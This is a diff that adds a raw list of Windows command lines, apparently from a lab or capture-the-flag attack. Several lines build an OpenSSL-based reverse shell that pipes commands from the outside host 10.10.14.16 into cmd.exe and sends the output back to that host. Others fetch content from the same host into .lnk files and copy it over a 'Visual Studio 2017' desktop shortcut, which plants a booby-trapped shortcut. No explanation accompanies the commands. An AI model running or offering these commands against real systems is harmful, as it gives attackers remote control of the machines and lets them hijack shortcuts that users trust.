@@ -1,0 +1,20 @@
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 |cmd.exe| c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.16:136
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 > c:\users\public\desktop\shortcuts\gg.lnk                       
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 > c:\users\public\desktop\shortcuts\gg.lnk                       
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 > c:\users\public\desktop\shortcuts\123.lnk                      
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 |cmd.exe| c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.16:136
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 > c:\users\public\desktop\shortcuts\oops.lnk                     
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 |cmd.exe| c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.16:136
+>/k start cmd c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 > c:\users\public\desktop\shortcuts\gg.lnk          
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 |cmd.exe| c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.16:136
+
+>
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 > c:\users\public\desktop\shortcuts\gg.lnk                       
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 |cmd.exe| c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.16:136
+>"c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk"                                                                                          
+>"c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk"
+>c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.16:73 |cmd.exe| c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.16:136
+
+>
+>copy /y "c:\users\public\desktop\shortcuts\gg.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk"                                       
+>copy /y "c:\users\public\desktop\shortcuts\gg.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" 
